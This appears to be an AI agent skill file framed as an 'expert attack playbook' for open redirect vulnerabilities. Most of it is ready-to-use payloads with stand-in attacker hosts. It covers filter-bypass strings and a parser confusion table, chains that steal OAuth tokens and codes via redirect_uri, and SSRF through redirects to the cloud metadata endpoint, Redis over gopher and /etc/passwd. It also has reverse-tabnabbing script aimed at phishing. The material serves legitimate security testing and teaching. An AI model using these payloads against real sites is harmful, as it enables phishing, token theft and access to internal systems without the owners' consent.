---
name: open-redirect
description: >-
  Open redirect playbook. Use when URL parameters, form actions, or JavaScript sinks control navigation targets and may redirect users to attacker-controlled destinations.
---

# SKILL: Open Redirect — Expert Attack Playbook

## 1. CORE CONCEPT

Open redirect occurs when an application redirects users to a URL derived from user input without validation.

```
https://trusted.com/redirect?url=https://evil.com
→ User sees trusted.com in the link → clicks → lands on evil.com
```

---

## 2. FINDING REDIRECT PARAMETERS

### Common Parameter Names

```text
?url=           ?redirect=      ?next=          ?dest=
?destination=   ?redir=         ?return=        ?returnUrl=
?go=            ?forward=       ?target=        ?out=
?continue=      ?link=          ?view=          ?to=
?ref=           ?callback=      ?path=          ?rurl=
```

### Client-Side (JavaScript) Sinks

```javascript
window.location = input
window.location.href = input
window.location.replace(input)
window.open(input)
document.location = input
```

---

## 3. FILTER BYPASS TECHNIQUES

| Validation | Bypass |
|---|---|
| Checks if URL starts with `/` | `//evil.com` (protocol-relative) |
| Checks domain contains `trusted.com` | `evil.com?trusted.com` or `trusted.com.evil.com` |
| Blocks `http://` | `//evil.com`, `https://evil.com`, `\/\/evil.com` |
| Checks URL starts with `https://trusted.com` | `https://trusted.com@evil.com` (userinfo) |
| Regex `^/[^/]` (relative only) | `/\evil.com` (backslash treated as path in some browsers) |
| Django `endswith('target.com')` | `http://evil.com/www.target.com` |
| Whitelist by domain suffix | Subdomain takeover on `*.trusted.com` |

```text
# Protocol-relative:
//evil.com

# Userinfo bypass:
https://trusted.com@evil.com

# Backslash trick:
/\evil.com
/\/evil.com

# Special character confusion:
http://evil.com#@trusted.com
http://trusted.com%00@evil.com

# Double encoding:
https://trusted.com/%2F%2Fevil.com
```

---

## 4. EXPLOITATION CHAINS

### Phishing Amplification

```
https://bigbank.com/redirect?url=https://bigbank-login.evil.com
→ Victim sees bigbank.com → enters credentials on clone site
```

### OAuth Token Theft

```
/authorize?redirect_uri=https://trusted.com/redirect?url=https://evil.com
→ Authorization code or token appended to evil.com URL
```

### CSRF Referer Bypass

```
1. Link to: https://trusted.com/redirect?url=https://trusted.com/change-email
2. Redirect preserves Referer from trusted.com
3. CSRF protection passes because Referer = trusted.com
```

### SSRF via Redirect

```
?url=https://attacker.com/redirect-to-internal
# attacker.com returns 302 → http://169.254.169.254/
# Server follows redirect → SSRF to metadata endpoint
```

---

## 5. TESTING CHECKLIST

```
[] Identify all URL parameters that trigger redirects
[] Test external domain: ?url=https://evil.com
[] Test protocol-relative: ?url=//evil.com
[] Test userinfo bypass: ?url=https://trusted.com@evil.com
[] Test backslash: ?url=/\evil.com
[] Test JavaScript sink: ?url=javascript:alert(1) (DOM-based)
[] Check OAuth flows for redirect_uri open redirect
[] Verify if redirect preserves auth tokens in URL
```

---

## 6. TABNABBING (REVERSE TABNABBING)

When a link opens a new tab with `target="_blank"` WITHOUT `rel="noopener"`:

```html
<!-- Vulnerable: -->
<a href="https://external.com" target="_blank">Click here</a>

<!-- Safe: -->
<a href="https://external.com" target="_blank" rel="noopener noreferrer">Click here</a>
```

```javascript
// On the attacker-controlled page:
if (window.opener) {
    window.opener.location = "https://phishing.com/fake-login.html";
}
```

---

## 7. OAUTH TOKEN THEFT (DETAILED)

### Implicit Flow

```text
/authorize?response_type=token
  &client_id=CLIENT
  &redirect_uri=https://target.com/callback/../redirect?url=https://evil.com
→ token in URL fragment sent to evil.com
```

### Authorization Code Flow

```text
/authorize?response_type=code
  &client_id=CLIENT
  &redirect_uri=https://target.com/callback%2f..%2fredirect%3furl%3dhttps://evil.com
→ code= query param goes to evil.com
```

### redirect_uri Bypass Patterns

```text
redirect_uri=https://target.com/callback/../open-redirect?url=evil.com
redirect_uri=https://target.com/callback?next=https://evil.com
redirect_uri=https://target.com/callback%23@evil.com
redirect_uri=https://target.com/callback/../../redirect
```

---

## 8. OPEN REDIRECT → SSRF CHAIN

```text
1. Submit URL to server-side fetcher: http://attacker.com/redirect
2. attacker.com responds: 302 Location: http://169.254.169.254/latest/meta-data/
3. Server follows redirect → SSRF to cloud metadata endpoint

# Multi-hop for filter bypass:
attacker.com/r1 → 302 → attacker.com/r2 (same domain, passes)
                  → 302 → http://169.254.169.254/ (internal)

# Cross-protocol redirects:
http://attacker.com/redirect → gopher://127.0.0.1:6379/...  (Redis)
http://attacker.com/redirect → file:///etc/passwd
```

---

## 9. URL PARSER CONFUSION TABLE

| Payload | Validator Sees | Browser Navigates To |
|---------|---------------|---------------------|
| `//evil.com` | Relative path | `https://evil.com` |
| `\/\/evil.com` | Path string | `https://evil.com` |
| `//evil.com\@target.com` | Contains `target.com` | `https://evil.com` |
| `//target.com@evil.com` | Starts with `target.com` | `https://evil.com` |
| `/%0d%0aLocation: https://evil.com` | Path string | Header injection → redirect |
| `//evil%252ecom` | `evil%2ecom` (not a domain) | `evil.com` (after double decode) |
